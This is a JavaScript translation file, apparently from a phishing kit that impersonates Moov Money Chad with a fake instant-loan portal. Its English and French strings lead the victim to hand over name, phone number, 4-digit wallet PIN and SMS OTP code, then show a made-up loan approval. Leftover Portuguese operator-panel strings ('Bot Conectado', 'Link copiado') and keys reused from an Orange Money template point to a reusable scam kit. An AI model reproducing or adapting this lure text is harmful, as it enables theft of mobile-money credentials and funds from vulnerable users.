(function() {
  const translations = {
    en: {
      title: "Moov Money Chad — Digital Loan & Credit Portal",
      heroBadge: "Instant Mobile Money Loan Approval",
      heroHeading: "Simulate Your Moov Money Loan",
      heroSubtitle: "Get funds directly into your Moov Money account within minutes.",
      requestedAmount: "Requested Amount",
      interestRate: "5% monthly rate",
      repaymentTerm: "Repayment Term",
      month1: "1 Month",
      months3: "3 Months",
      months6: "6 Months",
      months12: "12 Months",
      estMonthly: "Est. Monthly Repayment:",
      totalRepay: "Total Repayable:",
      applyNow: "APPLY FOR MOOV MONEY LOAN NOW",
      step1Title: "Loan Details",
      step1Sub: "Select your desired loan parameters (50,000 FCFA - 5,000,000 FCFA).",
      loanType: "Loan Type",
      amountLabel: "Amount (FCFA)",
      termLabel: "Term (Months)",
      purposeLabel: "Loan Purpose",
      continueToPersonal: "CONTINUE TO PERSONAL DETAILS",
      step2Title: "Applicant Information",
      step2Sub: "Enter your official identification & mobile account details.",
      firstName: "First Name",
      lastName: "Last Name",
      orangePhone: "Moov Money Mobile Number (+235)",
      employmentStatus: "Employment Status",
      agentConsent: "I authorize the Moov Money Agent to assist with tracking my application.",
      continueToAuth: "CONTINUE TO MOOV MONEY AUTHENTICATION",
      step3Title: "Sign in to Moov Money Account",
      step3Sub: "Confirm your phone number and enter your 4-digit Account PIN to validate.",
      phoneNum: "Moov Money Mobile Number",
      pinLabel: "Moov Money Account PIN (4 digits):",
      showPin: "Show",
      hidePin: "Hide",
      confirmLoanBtn: "CONFIRM & VALIDATE LOAN",
      confirmPinBtn: "CONFIRM PIN",
      awaitingApproval: "Awaiting Approval",
      pinAwaitingDesc: "Your 4-digit PIN has been submitted. Please wait while your login is verified...",
      step4Title: "OTP Verification",
      step4Sub: "Enter the 6-digit OTP verification code sent via SMS to your Moov Money number.",
      smsLabel: "OTP Verification Code",
      submitSmsBtn: "VALIDATE OTP CODE",
      awaitingVerification: "Awaiting OTP Verification",
      smsAwaitingDesc: "Your OTP code has been submitted. Verification in progress...",
      step5Title: "Loan Approved & Processing!",
      step5Sub: "Your loan request has been processed by Moov Money Financial Services.",
      appRef: "Application Reference:",
      applicantName: "Applicant:",
      orangeContact: "Moov Money Contact:",
      loanMode: "Loan Type:",
      requestedAmt: "Requested Amount:",
      termRepay: "Term / Payment:",
      currentStatus: "Current Status:",
      statusPending: "⏳ Under Review",
      newLoanBtn: "APPLY FOR ANOTHER LOAN",
      congratsHeading: "Congratulations!",
      congratsSub: "Your loan has been approved! Funds are being disbursed to your Moov Money account.",
      approvedAmountLabel: "APPROVED LOAN AMOUNT",
      complianceNoticeTitle: "COMPLIANCE NOTICE",
      complianceNoticeBody: "Your Moov Money Chad account must remain active. Ensure your mobile wallet is enabled for loan disbursement.",
      loanDetailsHeader: "Loan Details",
      monthlyPaymentLabel: "MONTHLY PAYMENT",
      loanTermLabel: "LOAN TERM",
      interestRateLabel: "INTEREST RATE",
      quickActionsTitle: "Quick Actions",
      btnDeposit: "Deposit Funds",
      btnWithdraw: "Withdraw Funds",
      btnLoanInfo: "Loan Details",
      nextStepsTitle: "Next Steps:",
      nextStepsBody: "You will receive an SMS confirmation with transaction details shortly.",
      returnHomeBtn: "Return Home",
      footerRights: "© 2026 Moov Money Chad — Services Financiers & Crédit Numérique"
    },
    fr: {
      title: "Moov Money Tchad — Portail de Crédit & Prêts Numériques",
      heroBadge: "Approbation Instantanée de Prêt Moov Money",
      heroHeading: "Simulez Votre Prêt Moov Money",
      heroSubtitle: "Recevez les fonds directement sur votre compte Moov Money en quelques minutes.",
      requestedAmount: "Montant Demandé",
      interestRate: "Taux mensuel de 5%",
      repaymentTerm: "Durée de Remboursement",
      month1: "1 Mois",
      months3: "3 Mois",
      months6: "6 Mois",
      months12: "12 Mois",
      estMonthly: "Mensualité Estimée:",
      totalRepay: "Total à Rembourser:",
      applyNow: "DEMANDER UN PRÊT MOOV MONEY",
      step1Title: "Détails du Prêt",
      step1Sub: "Choisissez le montant souhaité (50 000 FCFA - 5 000 000 FCFA).",
      loanType: "Type de Prêt",
      amountLabel: "Montant (FCFA)",
      termLabel: "Durée (Mois)",
      purposeLabel: "Motif du Prêt",
      continueToPersonal: "CONTINUER VERS LES INFOS PERSONNELLES",
      step2Title: "Informations du Demandeur",
      step2Sub: "Entrez vos informations d'identification et votre numéro mobile.",
      firstName: "Prénom",
      lastName: "Nom de famille",
      orangePhone: "Numéro Moov Money (+235)",
      employmentStatus: "Statut Professionnel",
      agentConsent: "J'autorise l'agent Moov Money à m'aider à suivre ma demande.",
      continueToAuth: "CONTINUER VERS L'AUTHENTIFICATION",
      step3Title: "Connexion Compte Moov Money",
      step3Sub: "Confirmez votre numéro de téléphone et entrez votre code PIN à 4 chiffres.",
      phoneNum: "Numéro Moov Money",
      pinLabel: "Code PIN Moov Money (4 chiffres):",
      showPin: "Afficher",
      hidePin: "Masquer",
      confirmLoanBtn: "CONFIRMER ET VALIDER LE PRÊT",
      confirmPinBtn: "CONFIRMER PIN",
      awaitingApproval: "En Attente d'Approbation",
      pinAwaitingDesc: "Votre code PIN a été soumis. Veuillez patienter pendant la vérification...",
      step4Title: "Vérification par Code OTP",
      step4Sub: "Entrez le code OTP à 6 chiffres envoyé par SMS sur votre numéro Moov Money.",
      smsLabel: "Code de Vérification OTP",
      submitSmsBtn: "VALIDER LE CODE OTP",
      awaitingVerification: "Vérification OTP en Cours",
      smsAwaitingDesc: "Votre code OTP a été soumis. Vérification en cours...",
      step5Title: "Prêt Approuvé et en Cours!",
      step5Sub: "Votre demande de prêt a été traitée par Moov Money Financial Services.",
      appRef: "Référence Demande:",
      applicantName: "Demandeur:",
      orangeContact: "Contact Moov Money:",
      loanMode: "Type de Prêt:",
      requestedAmt: "Montant Demandé:",
      termRepay: "Durée / Paiement:",
      currentStatus: "Statut Actuel:",
      statusPending: "⏳ En Cours d'Examen",
      newLoanBtn: "DEMANDER UN AUTRE PRÊT",
      congratsHeading: "Félicitations!",
      congratsSub: "Votre prêt a été approuvé! Les fonds sont en cours de versement sur votre compte Moov Money.",
      approvedAmountLabel: "MONTANT ACCORDÉ",
      complianceNoticeTitle: "AVIS DE CONFORMITÉ",
      complianceNoticeBody: "Votre compte Moov Money Tchad doit rester actif pour le versement du prêt.",
      loanDetailsHeader: "Détails du Prêt",
      monthlyPaymentLabel: "PAIEMENT MENSUEL",
      loanTermLabel: "DURÉE DU PRÊT",
      interestRateLabel: "TAUX D'INTÉRÊT",
      quickActionsTitle: "Actions Rapides",
      btnDeposit: "Déposer des Fonds",
      btnWithdraw: "Retirer des Fonds",
      btnLoanInfo: "Infos du Prêt",
      nextStepsTitle: "Prochaines Étapes:",
      nextStepsBody: "Vous recevrez sous peu un SMS de confirmation avec les détails.",
      returnHomeBtn: "Retour à l'Accueil",
      footerRights: "© 2026 Moov Money Tchad — Services Financiers & Crédit Numérique"
    },
    common: {
      "Bot Conectado": { fr: "Bot Connecté", en: "Bot Connected" },
      "Configurado": { fr: "Configuré", en: "Configured" },
      "Link copiado com sucesso!": { fr: "Lien copié avec succès !", en: "Link copied successfully!" },
      "Pendente": { fr: "En attente", en: "Pending" },
      "Em Análise": { fr: "En examen", en: "Under Review" },
      "Aprovado": { fr: "Approuvé", en: "Approved" },
      "Rejeitado": { fr: "Rejeté", en: "Rejected" },
      "meses": { fr: "mois", en: "months" },
      "candidatura(s).": { fr: "demande(s).", en: "application(s)." }
    }
  };

  let currentLang = localStorage.getItem("momo_lang") || "fr";

  window.t = function(key) {
    if (!key) return "";
    if (translations.common && translations.common[key]) {
      return translations.common[key][currentLang] || translations.common[key].en || key;
    }
    const dict = translations[currentLang] || translations.fr || translations.en;
    return dict[key] || key;
  };

  function setLanguage(lang) {
    currentLang = lang;
    localStorage.setItem("momo_lang", lang);
    const dict = translations[lang] || translations.fr || translations.en;
    
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.innerText = lang.toUpperCase();
    });

    document.querySelectorAll("[data-i18n]").forEach(el => {
      const key = el.getAttribute("data-i18n");
      if (dict[key]) {
        el.innerText = dict[key];
      }
    });
  }

  document.addEventListener("DOMContentLoaded", () => {
    setLanguage(currentLang);
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.addEventListener("click", () => {
        const nextLang = currentLang === "fr" ? "en" : "fr";
        setLanguage(nextLang);
      });
    });
  });
})();